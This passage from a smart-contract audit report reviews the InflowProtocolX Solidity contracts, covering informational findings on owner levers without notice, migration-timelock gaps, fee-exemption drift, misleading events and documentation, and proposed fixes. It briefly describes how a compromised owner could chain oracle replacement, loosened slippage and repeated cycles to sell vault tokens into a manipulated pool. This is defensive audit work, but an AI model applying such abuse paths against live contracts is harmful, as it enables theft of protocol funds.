In sub-section 3, slices keep landing in a controller-as-wallet until another rotation through the timelock (at least 24 hours, 48 hours in `Deploy.s.sol`) completes, but the loss is bounded: protocol revenue, not user funds, each payout capped by the vault's live stable surplus (`getStableSurplus()`), only for cycles inside that window, and on the queue path the change is public and cancellable before it executes, so the owner has a chance to catch it.

In sub-section 4, an 18-decimal stable makes every stable floor and USD threshold 1e12 times too small, and a transfer fee comes out of the conversion module's slippage budget. Non-distinct tokens make an instance stop cycling or route trades to the wrong pool, recoverable after launch, once its wiring is locked, only by a 30-day migration, though `wpls == stable` would surface on the first cycle, when `getZone()` reverts, before anything is at stake. In these cases, nothing is stolen or permanently lost; the stable properties are documented operator duties (`docs/MIGRATION_PLAYBOOK.md:88`, `ConversionModule.sol:487-493`), any successor faces the 30-day notice, and the deploy script defaults WPLS and USDC to distinct `InflowAddresses` constants (`script/Deploy.s.sol:93-94`).

The issue is Informational because every case needs the trusted owner, deployer or multisig to choose a wrong value, repeat a call or pass a wrong constructor argument, and each is limited as above.

## Recommendation

1. Bound the slippage settings from below:

   a. Enforce a lower bound of at least 50-100 bps for the LiquidityDeployer slippage.

   b. Treat the ExpansionModule slippage differently: `_minRailOut()` also uses `lpSlippageBps` as every rail purchase's floor (`ExpansionModule.sol:1271-1273`), and since L-05 shows a purchase loses close to that tolerance to whoever triggers the cycle, a 50-100 bps lower bound would guarantee that much room on every purchase and rule out the tight purchase floor L-05 recommends. First decouple the purchase floor, as L-05 recommends, so a lower bound governs only the add minimums at no cost; if the parameter stays shared, reject only 0 and keep any lower bound to a few bps, which already absorbs the router's rounding on any non-dust leg.

   c. Alternatively, for both slippage settings, derive the paired-side minimum from the router's floored ratio (`floor(ipxAmount·R/I)`) instead of the requested amount, so a 0 setting accepts exactly what the router takes; with legs and minimums from the same call's live reserves, no price protection is lost (the TWAP checks before the add provide it). In the `ExpansionModule`, a 0 setting would still hold every rail purchase to its full TWAP output via `_minRailOut()`, buying only when the route's spot fill reaches it and otherwise skipping with `RouteBelowFloorSkipped`: L-05's recommended purchase rule, which skips rather than reverts, but one to choose deliberately, not reach through this setting.

   d. For the documented zero leg deviation, either have the playbook state that zero in practice stops conversion and deployment, or, if zero is not meant as an off switch, enforce a lower bound of 200-300 bps, as `setConversionCap()` does for its own zero, and update the playbook's 0..2,000 range to match.

2. Add the missing guards to the `IPXToken` owner functions:

   a. Revert in `openTrading()` if trading is already open (`if (tradingOpen) revert TradingAlreadyOpen();`, a new error).

   b. In `rescueToken()`, add `if (to == address(0)) revert ZeroAddress();` and `if (token.code.length == 0) revert RescueTransferFailed();`. SafeERC20, as the vault uses, would cover the codeless case but not the recipient, so keep the zero-address check either way, as `VaultController.rescueToken()` does.

   c. Reject `address(0)` in `setPair()` and `setFeeExempt()`. Optionally, when flagging (`_isPair == true`), require the pair's `token0()` or `token1()` to be `address(this)`, leaving unflagging unchecked so a wrong flag can always be cleared; that check suits only V2-style venues, since it would refuse an IPX pool without `token0()`/`token1()`, which the README asks the operator to flag (README, "Unregistered IPX pools"), so it should stay optional.

3. Bound the `TreasuryController` timelock and reject the controller's own address. Add a `MAX_TREASURY_WALLET_TIMELOCK` constructor bound no lower than the 7-day delay the constructor NatSpec recommends for stronger holder protection, for example, 30 days (the VaultController migration delay), so the documented choices stay available. Reject `address(this)` as the wallet in the constructor and `queueTreasuryWalletChange()`; this cheap check covers only one wrong address, so reviewing each queued address during the cancellable delay remains the main defence against any non-custodial wallet.

4. Enforce the token assumptions in the constructors and on migration:

   a. Add `require(IERC20Metadata(_stable).decimals() == 6)` to the VaultController, ConversionModule, LiquidityDeployer and ExpansionModule constructors, and in `executeVaultControllerMigration()` run it on the successor's `stable()` only when it differs from the current one, so no hard call into the existing stable enters a migration path that deliberately keeps a failing stable from blocking migration (`VaultController.sol:897-899`), the escape route from an unusable stable; a successor built from the audited code has passed the constructor check anyway. A transfer fee cannot be reliably detected with a view call, so it stays an operator check.

   b. Require `ipxToken`, `wpls` and `stable` to be pairwise distinct in each constructor.

## Team Response

Fixed.

# [I-17] Owner Levers Take Effect Outside Any Binding Notice, and Fee Exemptions and Vault Privileges Are Not Scoped to the Roles They Serve

## Severity

Informational Risk

## Description

Several owner levers act without notice, the migration notice binds only an address, and fee exemptions and vault privileges ignore the roles they serve: holders get less protection than the NatSpec and documented owner surface suggest, and the privileged set can drift.

### 1. Owner levers over pricing and the cooldown take effect instantly, and the migration notice binds only the successor's address

**(a) Oracle replacement, `clearCooldown()` and `recordPriceSnapshots()` take effect immediately.** All five TWAP-oracle consumers swap the oracle instantly via `setTWAPOracle()` (`VaultController.sol:245-249`, `ConversionModule.sol:184-188`, `LiquidityDeployer.sol:143-147`, `ExpansionModule.sol:257-261`, `ArbitrageMonitor.sol:203-207`). It prices D and B, the conversion leg minimums, the liquidity deployer's TWAP gates and the arbitrage zones, yet VaultController's NatSpec calls it "a defensive read-only signal, not a fund-controlling module" (`VaultController.sol:242-243`) while ConversionModule's "the slippage source for `_swap()`" (`ConversionModule.sol:180-181`). `clearCooldown()` zeroes `lastExecutionTime`, so the next cycle passes the cooldown gate at once, and the owner can `poke()` one at any time after launch (`VaultController.sol:403-407`); `recordPriceSnapshots()` overwrites the spot guard's reference for when no oracle is wired. Neither emits an event (`VaultController.sol:1507-1514`).

A compromised owner could wire its own oracle, loosen `setSlippage()` (up to 20%) and `setMaxLegDeviation()` (up to 2,000 bps), both measured against it, and repeat `clearCooldown(); poke();`: whenever other gates still select a conversion (D at or above the convert threshold and no bullish momentum, both read through that oracle, plus an IPX surplus), each round sells vault IPX into a pool the owner has moved, past guards that all read the owner's oracle.

Only the VaultController migration and the treasury-wallet change wait on a notice (the Locker's multisig actions wait on its lock period). The post-launch owner surface in `AUDIT_BRIEF.md:50-66` ends "This list is exhaustive." yet omits all these levers, plus `setKeeper()`, `ConversionModule.setConversionCap()` and `setMaxLegDeviation()`; `README.md:293-312` lists only `poke()`. Only other documents mention them: `docs/MIGRATION_PLAYBOOK.md:47-49` (`setTWAPOracle()` is not lock-gated), `M3_DELIVERABLE.md:187-191` (`clearCooldown()` and `recordPriceSnapshots()` as remaining privileged actions), `PRE_AUDIT_RESPONSE.md:188` (`clearCooldown()` as an owner-only state mutation).

**(b) The migration notice binds only an address, and execution does not enforce the playbook's prerequisites.** Queueing checks only that trading is open and `newVC` is non-zero, and the destination checks at execution (deployed code, matching `ipxToken()` and `wpls()`, `IPXToken.sol:182-189`) skip the successor's `modulesLocked()`, `pairsLocked()` and owner (the locks are per-instance, and `handoffTo()` does not carry them over). `VCMigrationQueued` publishes the address for 30 days, so anyone who checks sees a codeless, proxy or unlocked destination, but nothing ties the recipient to what was reviewed: it can be codeless during the notice (say, a CREATE2 address deployed just before execution), an upgradeable proxy whose logic changes first, or an unlocked successor re-wired after the switch, through `setModules()`, to a module that calls `withdrawTo()`. Yet the playbook says that at execution the successor cluster "must be fully deployed, wired, locked, owned by the multisig, tested, and approved" and "If any prerequisite is missing the transaction reverts" (`docs/MIGRATION_PLAYBOOK.md:67-71`).

The same gap lets an honest out-of-order migration lose stage state without a revert. `receiveProgressionState()` merges the predecessor's rail and treasury activation flags only into successor modules that are already set, skips the rest and still emits `ProgressionStateReceived` (`VaultController.sol:809-818`), although the call-site comment makes it a hard call because "a lost flag would drop the successor's stage (floors and thresholds)" (`VaultController.sol:914-916`). Modules deployed before the notice and wired only after the switch keep just the flags they copied from their `_predecessor` at construction (`ExpansionModule.sol:240-243`, `TreasuryController.sol:80-83`), so every stage activated during the notice is lost, against the playbook's post-migration check that the stage and treasury activation do not regress (`docs/MIGRATION_PLAYBOOK.md:509-511`). The playbook wires and locks the successor (steps 1.8 and 1.9) before queueing (Phase 5), so this needs the owner to depart from it.

The NatSpec on `pendingVaultController` ("Multisig cannot mint, drain, change taxes, or touch locker funds through this mechanism", `IPXToken.sol:57-59`) and on `queueVaultControllerMigration()` ("Cannot mint tokens, change taxes, drain the vault, touch locker funds, or affect any other contract", `IPXToken.sol:153-154`), echoed in `README.md:286-288`, overstates this: the successor receives the vault's entire IPX, WPLS and stable balances and becomes the sole caller of `IPXToken.setInSwap()`, whose `inSwap = true` turns off the tax (`IPXToken.sol:409-412`) and the cycle trigger (`IPXToken.sol:436`).

The queue even accepts the current controller; that self-migration passes every check (`handoffTo(self)` moves the balances back to the same contract, each `receive*` hook accepts the vault calling itself, the protected seed is zeroed and received back), yielding a 30-day notice for a no-op closed by `VaultControllerUpdated(vc, vc)`.

### 2. Fee exemptions and vault privileges are not scoped to the module and reserve-wallet roles they serve

**(a) A rotated reserve wallet keeps its fee exemption.** `IPXToken` has no reserve-wallet role, only per-address flags set with `setFeeExempt()`: the deploy script sets the reserve wallet's, or relies on the constructor's when `RESERVE_WALLET` is the deployer (`script/Deploy.s.sol:222-224`), and `LiquidityDeployer.setReserveWallet()` and `ExpansionModule.setReserveWallet()` only overwrite their pointer (`LiquidityDeployer.sol:120-125`, `ExpansionModule.sol:247-252`). The token itself clears only the deployer's and initial holder's exemptions (in `openTrading()`) and the VaultController cluster's (`_clearVCExemptions()`, on each controller change). A rotation, say after a key leak, without `setFeeExempt(old, false)` thus leaves the old wallet `isFeeExempt == true`; as an exempt party on either side means no tax and no cycle (`IPXToken.sol:393-394`; through `isSell` also no trigger at `IPXToken.sol:436`), its key holder trades tax-free and can relay for others (pair to old wallet untaxed, then onward peer-to-peer), relayed sells skipping `checkAndExecute()`. Only the old key's holder, the operator or a party that leaked it, can do so; it is not a public bypass.

With the deployer as reserve wallet, `openTrading()` clears its exemption, so its taxed sells trigger cycles that can pull IPX from it mid-sell (the LiquidityDeployer's `_pull()`, the ExpansionModule's rail seeding); a sell of more than the reserve still holds after the pull, in practice nearly its whole inventory, reverts at the final transfer (`IPXToken.sol:443`) with `ERC20InsufficientBalance`. Only the deploy script's `RESERVE_WALLET == deployer` option creates this; the revert is self-inflicted, retryable with a smaller amount, and loses nothing.

**(b) Module fee exemptions follow live getters, and `setModules()` never resyncs them.** `_grantVCExemptions()` and `_clearVCExemptions()` read `conversionModule()`, `liquidityDeployer()` and `expansionModule()` from the controller at call time and record nothing (`IPXToken.sol:214-229`). They run only from `IPXToken.setVaultController()` and `executeVaultControllerMigration()`; `VaultController.setModules()` (`VaultController.sol:251-279`) rewrites the modules and emits `ModulesSet` (`VaultController.sol:268-278`) without telling the token. A replaced module thus stays exempt, its replacement never is, and the migration clear hits the current modules, not the granted set; if `setVaultController()` precedes `setModules()`, the getters return zero and `_setExemption()` silently skips them. Each case needs `setModules()` between the grant and `lockModules()`: `Deploy.s.sol` wires the modules before setting the controller and locks them in the same script, and `docs/MIGRATION_PLAYBOOK.md` locks the successor's modules (step 1.9) before execution.

**(c) `withdrawTo()` and `creditProtectedSeed()` trust any authorised module, with no floor or seed bound on the vault side.** `onlyAuthorisedModule` (`VaultController.sol:205-212`) admits all three modules and the VaultController sets no floor, seed or surplus limit of its own, so its reserves rest entirely on each module's sizing: `withdrawTo()` sends any token, in any amount, to any non-zero address, and `creditProtectedSeed()` only caps the bucket at the stable balance and accepts every module, though its NatSpec and that of `protectedSeedStable` name only the conversion module. Today every sizing path reads the live surplus (for a rail seed, the live `seedWithdrawable()`) before withdrawing, and the only `creditProtectedSeed()` caller credits the stable delta it measured (`ConversionModule.sol:260-265`).

## Location of Affected Code

Sub-section 1(b): the only checks made at queueing:

File: [src/IPXToken.sol#L155-L161](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/IPXToken.sol#L155-L161)

```solidity
function queueVaultControllerMigration(address newVC) external onlyOwner {
    if (!tradingOpen) revert TradingNotOpen();
    if (newVC == address(0)) revert ZeroAddress();
    pendingVaultController = newVC;
    pendingVCEta = block.timestamp + InflowConstants.VC_MIGRATION_DELAY;
    emit VCMigrationQueued(newVC, pendingVCEta);
}
```

Sub-section 2(c): no floor, seed or surplus check, and both functions are open to every authorised module:

File: [src/VaultController.sol#L761-L774](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/VaultController.sol#L761-L774)

```solidity
function withdrawTo(address token, uint256 amount, address to)
    external
    onlyAuthorisedModule
{
    if (to == address(0)) revert ZeroAddress();
    IERC20(token).safeTransfer(to, amount);
    emit Withdrawn(token, amount, to);
}
// code
function creditProtectedSeed(uint256 amount) external onlyAuthorisedModule {
```

## Impact

This is Informational. Except for the stage loss, sub-section 1 needs the trusted owner multisig to act maliciously or be compromised, and even then each of the back-to-back rounds above, run without notice to holders, is limited by `capBps` (25 bps of each target pool's IPX reserve by default, at most 50). Migration gives the owner nothing new: review area 5 of `AUDIT_BRIEF.md` discloses that a migration moves all the vault's IPX, WPLS and stable to a contract the owner chooses (`AUDIT_BRIEF.md:218`), `setTaxes(0, 0)` is already instant, and the 30-day public notice cannot be shortened. The stage loss instead needs an honest owner to execute before wiring the successor, against the playbook's order: the stage, its floors and its thresholds go backwards, and unless the owner wires fresh modules built from the predecessor's before locking the successor, which restores them (a fresh TreasuryController also needs a fresh LiquidityDeployer, which pins it immutably, `LiquidityDeployer.sol:47`), the cycle reopens each lost stage and re-seeds rails into protocol-locked LP, misallocating protocol-owned value rather than losing it. What remains is no notice for the instant levers, a migration notice that binds less than it seems, and a NatSpec, playbook and documented owner surface that overstate the guarantees, not a demonstrated loss.

Sub-section 2 needs a trusted-owner mistake (a rotation without the manual clear, or a rewiring between grant and lock) or a future faulty module, and loses no principal: tax revenue and cycle cadence leak only on one retired key's volume, until one owner call clears its exemption. Module exemptions drift only as bookkeeping and protocol flows are unaffected, since modules move IPX only inside the cycle, which runs with `inSwap` set (`VaultController.sol:416`), turning off tax and trigger (`IPXToken.sol:409-412`, `IPXToken.sol:436`), so in-cycle reserve pulls and module transfers need no exemption, and a stale one on a retired module grants nothing the owner cannot grant instantly with `setFeeExempt()`. The missing vault-side bounds have no impact today; as missing defence in depth, they would worsen a faulty or compromised future module's bug, not create one.

## Recommendation

1. **Owner levers and the migration notice.**

   **(a)** Put the oracle setters behind a short timelock, like the migration and the treasury wallet, for every change after `tradingOpen`, the first assignment on each contract included: the launch wiring (`script/Deploy.s.sol:297-303`) still runs in one broadcast, a live controller can no longer switch oracles unannounced, and a successor cluster, wired after launch, would queue its assignments at step 1.8 of the migration playbook and execute them later, well inside the 30-day migration notice. Five setters mean five queues unless the consumers read one oracle pointer from the VaultController, as I-15 suggests, and the conformance probe I-15 proposes should run when a queued change executes, not only when queued. Keep the delay short, as it also slows replacing a failing feed.

   `clearCooldown()` does not suit a timelock: the cooldown lasts 30 minutes, so a delayed call normally lands after the prompting cooldown has expired, leaving only the power to cut short whichever one is running, once per delay period. Rate-limit it instead to once per `COOLDOWN_PERIOD`, recording its last use, which keeps the emergency use and limits the owner to two rounds in any 30-minute window; or remove it, as no documented flow uses it and the keeper's `poke()` already runs a round once a cooldown expires.

   Emit events from `clearCooldown()` and `recordPriceSnapshots()`, and add all these levers, plus `setKeeper()`, `setSlippage()`, `setMaxLegDeviation()` and `setConversionCap()`, to the owner surface in `AUDIT_BRIEF.md` and `README.md`. The three tolerance setters stay instant under this fix; they are bounded, but the combination in sub-section 1(a) loosens them too, so delay them as well if the notice should cover the whole combination.

   **(b)** On queueing, require `newVC.code.length > 0`, reject `newVC == vaultController`, and store `pendingVCCodehash = newVC.codehash`, cleared with the queue on cancellation and execution. On execution, recheck the code hash and require the successor's `modulesLocked()` and `pairsLocked()` with a non-zero `expansionModule()` and `ipxWplsPair()` (both locks can precede any wiring; `setModules()` and `setPairs()` write all their addresses together, and `setModules()` rejects a zero module, so the progression merge then always finds both modules), its `twapOracle()` to equal the current controller's non-zero oracle, not merely be set (the playbook reuses the single production oracle; a bare non-zero check would accept one assigned just before execution), and its `owner()` to equal the token's owner, another playbook prerequisite; add the two lock getters and `owner()` to `IVaultController`. The successor must then be fully deployed, wired and locked before queueing, as the playbook already orders (locked in Phase 1, queued in Phase 5). The notice still does not bind its bounded tolerance settings, adjustable after the switch as on any live controller. A code hash cannot detect an upgradeable proxy changing its implementation, so also adopt a policy that successors are not upgradeable. Independently of these checks, make `receiveProgressionState()` revert when a predecessor module is non-zero but the successor's matching module is unset, so the merge cannot be skipped silently. Correct the NatSpec, README and playbook to match what a migration permits and what execution checks.

2. **Fee exemptions and vault privileges.**

   **(a)** On every reserve-wallet rotation, put `setFeeExempt(old, false)` and `setFeeExempt(new, true)` to match the deploy-time setup, in the owner batch that repoints both the LiquidityDeployer and the ExpansionModule (`IPXToken.setFeeExempt()` is owner-only and neither `setReserveWallet()` can call it), and document the step in the operator playbook. Do not instead derive the exemption from the modules' live pointers inside `_update()`: that adds external calls to the VaultController and both modules to every transfer, raising every trade's gas, and makes every taxed transfer, the sell that runs the cycle included, revert whenever one of those reads fails. Treat `RESERVE_WALLET == deployer` as unsupported in production.

   **(b)** Store the granted set and clear exactly that set, which corrects the migration clear; a module installed after the grant still goes unexempted, harmless only because module transfers run under `inSwap`. Alternatively, before granting, require `modulesLocked()` and three non-zero module getters (`lockModules()` does not itself require the modules to be set), so the set cannot change afterwards. That needs `modulesLocked()` added to `IVaultController`, `Deploy.s.sol` to call `lockModules()` before `setVaultController()` (it already registers its POL depositor before that point), and every successor locked before `executeVaultControllerMigration()`, as the migration playbook already does in Phase 1 (see sub-section 1(b) above).

   **(c)** Restrict `creditProtectedSeed()` to the conversion module, its only caller today (`ConversionModule.sol:265`). In `withdrawTo()`, check after the transfer that the vault still holds the withdrawn token's floor: `ipxFloor` for IPX, `wplsFloor()` for WPLS, and `stableFloor()` plus `protectedSeedStable` for the stable (the seed term applies to the stable only; the ExpansionModule, meant to spend the seed, is held to `stableFloor()` alone). The check does not bind today, since current withdrawals are sized from same-step surplus or `seedWithdrawable()` reads; a future module's over-withdrawal would instead revert and roll back the cycle. The cost is a balance read and, for WPLS and the stable, an `activeStage()` call into the ExpansionModule per withdrawal.

## Team Response

Fixed.

# [I-18] ArbitrageMonitor NatSpec Understates TWAP-Composition Bias, and `getD()` Cannot Distinguish Guard Failure From Zero Surplus

## Severity

Informational Risk

## Description

### 1. The ArbitrageMonitor NatSpec understates the bias caused by a sudden PLS move

The `ArbitrageMonitor` documentation describes the bias from multiplying averaged price legs separately using linear-ramp figures, even though its worked example is a step change. For a mid-span PLS step, the composed reading has a larger bias: `(1 + k)^2 / (4k)`, rather than the linear-ramp result `(1 + k) / 2 * ln(k) / (k - 1)`.

| PLS fall | NatSpec figure | Mid-span step bias |
| -------- | -------------: | -----------------: |
| 20%      |   about 40 bps |            125 bps |
| 30%      |  about 100 bps |            321 bps |
| 45%      |       about 3% |            920 bps |

The 1.2% margin referenced by the NatSpec is reached at approximately a 19.6% mid-span fall, rather than the documented approximately 30% move. The documentation also says the bias follows the move direction and can hide or create a zone. With a flat IPX/USD price, the composition bias instead raises the arithmetic composition and lowers the harmonic composition regardless of move direction, which pushes the monitor toward `NEUTRAL` and cannot independently create a zone.

### 2. `getD()` returns zero for both an empty vault and an unavailable valuation

`VaultController.getD()` discards the `manipulated` status returned by `_calculateD_view()`. As a result, callers receive `0` both when the vault has no surplus and when a price guard has tripped, a required TWAP window is unavailable, or the IPX leg cannot be priced. An off-chain consumer cannot distinguish these states through the current interface.

Between cycles, `getD()` and `getIpxSurplus()` use the currently stored `ipxFloor`. If buy tax has raised the vault IPX balance above `ipxPeak`, the next cycle first ratchets the floor to 70% of that new peak and then calculates D. For example, with a 60M peak, a 42M floor, and a 62M balance, the views report 20M IPX surplus; the next cycle ratchets the floor to 43.4M and uses 18.6M.

This is a current-state versus next-cycle-preview distinction, not incorrect on-chain accounting. No in-scope state-changing path reads `getD()`, and `ConversionModule` reads `getIpxSurplus()` only after the cycle has applied the ratchet.

## Location of Affected Code

`src/ArbitrageMonitor.sol:389-396` documents linear-ramp bias next to a step-shaped example:

File: [src/ArbitrageMonitor.sol#L389-L396](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/ArbitrageMonitor.sol#L389-L396)

```solidity
///      construction. IPX at a flat dollar price while PLS halves
///      half-way through the span gives avg(WPLS per IPX) = 1.5 and
///      avg(USDC per WPLS) = 0.75, a composed 1.125 against a direct
///      IPX/USDC average of 1.0: a 12.5% phantom gap on a spot gap of
///      zero, with no attacker involved. The size follows the PLS
///      move inside the span - about 40 bps at 20%, 100 bps at
///      30%, 3% at 45% - and its direction follows the move's, so
///      it can hide a real gap as well as fake one. Nothing here can
```

`src/VaultController.sol:734-738` returns only D and drops the guard status:

File: [src/VaultController.sol#L734-L738](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/VaultController.sol#L734-L738)

```solidity
function getD() external view returns (uint256) {
    if (ipxWplsPair == address(0) || wplsStablePair == address(0)) return 0;
    (uint256 D,) = _calculateD_view();
    return D;
}
```

`src/VaultController.sol:1088-1096` returns `(0, true)` for an unavailable or guarded valuation:

File: [src/VaultController.sol#L1088-L1096](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/VaultController.sol#L1088-L1096)

```solidity
if (twapOracle != address(0)) {
    if (!_twapTracksAnchor()) return (0, true);
    if (_twapManipulationCheckView(wplsStableQ)) return (0, true);
    // code
}
// code
if (!ipxPriced) return (0, true);
```

## Impact

The current code remains fail-closed. The first issue overstates the robustness documented for the monitor during large intra-window PLS movements. The second prevents dashboards, keepers, and integrators from determining whether a zero D reflects an empty vault or an unavailable or guarded valuation.

No in-scope state-changing path relies on either ambiguous view result. This is Informational.

## Recommendation

Correct the `ArbitrageMonitor` NatSpec, README, and migration documentation to use the step-case figures where they describe a step-shaped example. State that composition bias alone pushes a flat-IPX/USD reading toward `NEUTRAL` and cannot create a zone.

Expose a status-bearing D view, for example:

```solidity
function getDWithStatus() external view returns (uint256 D, bool manipulated) {
    if (ipxWplsPair == address(0) || wplsStablePair == address(0)) return (0, false);
    return _calculateD_view();
}
```

Keep `getD()` for backwards compatibility and document that a zero result may mean either no surplus or an unavailable valuation.

## Team Response

Fixed.

# [I-19] Several Events Misreport What Happened, so Logs Cannot Be Used to Reconstruct Protocol Activity

## Severity

Informational Risk

## Description

Several events log something other than what actually happened (a deployment that placed nothing, the wrong skip reason or label, transitions that did not occur, and a submitted count instead of an applied one), so indexers and operators that rely on logs build a wrong picture of the protocol.

### 1. `Deployed` is emitted for a deployment that placed nothing

`LiquidityDeployer.deploy()` emits `Deployed` on every path past the early `return false` (`LiquidityDeployer.sol:239`). That includes a call that placed nothing: each base leg declined or returned zero, no rail slice was placed, and `deploy()` returns `false`. Several of those zero returns emit no `LpLegDeclined` event either: the reserve-wallet clamp (`LiquidityDeployer.sol:473-474`, `:548-549`), the zero-ratio pair exits (`:451`, `:535`) and the stable leg's surplus clamp (`:532`). The event's fields are documented as planned figures (`LiquidityDeployer.sol:296-304`), so nothing in it distinguishes this case from a real deployment. The function's own NatSpec says `didDeploy` exists so that the caller "does not report a deployment that every leg declined". The event reports exactly that.

The `_ipxForStable()` NatSpec in ConversionModule is also wrong. It says "the pool cap in `_fixedSeedLegs()` bounds the leg either way", but an unbounded shortfall (`type(uint256).max`) always satisfies `seedByShare <= shortfallIpx`, so `_planLegs()` takes `_proportionalLegs()` (`ConversionModule.sol:354-355`), and the cap that actually applies is that function's proportional scaling (`ConversionModule.sol:376-384`). The same comment's claim that the swap "fails closed" without a TWAP is wrong only while `twapOracle` is zero; I-15 covers it together with the other documents that make the same claim.

### 2. ExpansionModule events report the wrong reason, label or content

Operators reading the ExpansionModule logs get the wrong reason for a skipped rail, and indexers count a rail activation on every cycle that places a rail slice.

`_dustWithinBound()` chooses between `PairOneSidedSkipped` and `PairPreloadedSkipped` from `oneSided` alone. A `dustLive` pair has LP minted and both reserves non-zero, so `oneSided` is false, and when such a pair fails the balance check, the module emits `PairPreloadedSkipped`. That event's NatSpec describes a pair with no LP minted. The trigger is narrow: `_planSeed()` sets `dustLive` only after the pair's reserves passed the same bound against the same `ipxLeg` and `expectedRail` (`ExpansionModule.sol:919-925`), so `_dustWithinBound()`, which reads `balanceOf()`, can fail for such a pair only after someone transfers tokens into it without a `sync()`. Anyone can do that, but it is not an ordinary path.

`PairTWAPNotMaturedSkipped` is documented for a pair whose TWAP has not yet completed a window. It is also emitted when oracle registration reverts, when `consult()` reverts, and when a reserve or the TWAP-chain value is zero (`ExpansionModule.sol:1214-1221`, `:1415-1420`, `:1433-1435`).

`PairTWAPDeviationSkipped` declares a `twapIpx` field, and its NatSpec describes a comparison against the pair's pinned TWAP (`ExpansionModule.sol:107-117`). `_twapPriceOkForExistingPair()` fills that field with `fairIpx`, the route-chain value from `_railToIpxTwap()` (`ExpansionModule.sol:1431-1440`).

`RailAddressUpdated` indexes its `string name` parameter (`ExpansionModule.sol:72`). An indexed string is logged only as its keccak256 hash, so the rail name cannot be read from the log, only matched against the hashes of the four known names, and the slot index `idx` is not logged (`ExpansionModule.sol:277-280`). Because `setRailAddress()` maps each `idx` to one fixed name, both can still be recovered by that hash match, so this is an indexing inconvenience rather than lost information.

`contributeToRail()` emits `ExpansionActivated` for every rail slice it places (`ExpansionModule.sol:627`), although its NatSpec says it writes no activation flag. `_try()` emits the same event for a real first activation, after setting the rail's active flag (`ExpansionModule.sol:808-824`). Only a LiquidityDeployer comment (`LiquidityDeployer.sol:305-306`) mentions the dual use.

### 3. The `FeeExemptionSet` event stream does not match `isFeeExempt` state

The fee-exempt set cannot be rebuilt from `FeeExemptionSet` logs. The constructor grants three exemptions without emitting, and the VaultController cluster helpers emit even when nothing changes.

The `IPXToken` constructor writes `isFeeExempt` directly for the deployer, the initial holder and the token itself, and emits no event (`IPXToken.sol:118-120`). `_setExemption()` writes and emits unconditionally. Every VaultController rotation or migration calls it through `_grantVCExemptions()` and `_clearVCExemptions()`, so it logs a transition even for an account already in the requested state. Elsewhere, the token gets this right: the owner's `setFeeExempt()` reverts on a no-op (`IPXToken.sol:248-252`), and `openTrading()` emits only when it actually clears a flag.

### 4. `PolDepositorsReceived` reports the input length, not the depositors actually added

`receivePolDepositors()` emits the length of the array it receives, not the number of entries it actually appends, so the event over-counts whenever the predecessor's registry overlaps the successor's.

During a migration, `handoffTo()` passes the predecessor's whole `_polDepositors` array to `successor.receivePolDepositors()` (`VaultController.sol:923`). The successor passes each entry to `_appendPolDepositor()`, which silently skips the zero address and any address it already holds (`VaultController.sol:980-988`). It then emits `PolDepositorsReceived(msg.sender, n)` with `n = depositors.length`. An overlap occurs whenever the successor already registered an address the predecessor carries, for example, if the operator also registers the launch depositor (which `Deploy.s.sol:199` registers on the launch controller) on the successor through `addPolDepositor()`, which skips such a duplicate silently as well.

## Location of Affected Code

`Deployed` is emitted on every path past the early return, even when `deploy()` returns `false`:

File: [src/LiquidityDeployer.sol#L307-L308](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/LiquidityDeployer.sol#L307-L308)

```solidity
emit Deployed(deployUsd, plan.wplsUsd, plan.stableBaseUsd, treasuryPaid);
return placedUsd + treasuryPaid > 0;
```

The NatSpec names `_fixedSeedLegs()` as the bound on an unbounded shortfall, which `_planLegs()` always routes to `_proportionalLegs()`:

File: [src/ConversionModule.sol#L453-L458](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/ConversionModule.sol#L453-L458)

```solidity
///      Unbounded when the TWAP is unavailable (the swap itself fails
///      closed then, so nothing is over-credited) or when the gap is at
///      least the pool's whole IPX reserve, which no single leg can fill;
///      the pool cap in `_fixedSeedLegs` bounds the leg either way.
function _ipxForStable(uint256 stableOut) internal view returns (uint256) {
    if (twapOracle == address(0)) return type(uint256).max;
```

The skip event is chosen from `oneSided` alone, including for a `dustLive` pair:

File: [src/ExpansionModule.sol#L1001-L1007](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/ExpansionModule.sol#L1001-L1007)

```solidity
if (
    IERC20(ipxToken).balanceOf(pair) * bps <= plan.ipxLeg * DUSTED_PAIR_MAX_BPS
        && IERC20(rail).balanceOf(pair) * bps <= plan.expectedRail * DUSTED_PAIR_MAX_BPS
) return true;
if (oneSided) emit PairOneSidedSkipped(rail, pair);
else emit PairPreloadedSkipped(rail, pair);
return false;
```

The cluster helper emits whether or not the state changes (called from `_grantVCExemptions()` at `:214-219` and `_clearVCExemptions()` at `:224-229`):

File: [src/IPXToken.sol#L231-L235](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/IPXToken.sol#L231-L235)

```solidity
function _setExemption(address account, bool exempt) internal {
    if (account == address(0)) return;
    isFeeExempt[account] = exempt;
    emit FeeExemptionSet(account, exempt);
}
```

The event reports the submitted length:

File: [src/VaultController.sol#L828-L835](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/VaultController.sol#L828-L835)

```solidity
function receivePolDepositors(address[] calldata depositors) external {
    _requireCurrentVaultController();
    uint256 n = depositors.length;
    for (uint256 i; i < n; ++i) {
        _appendPolDepositor(depositors[i]);
    }
    emit PolDepositorsReceived(msg.sender, n);
}
```

## Impact

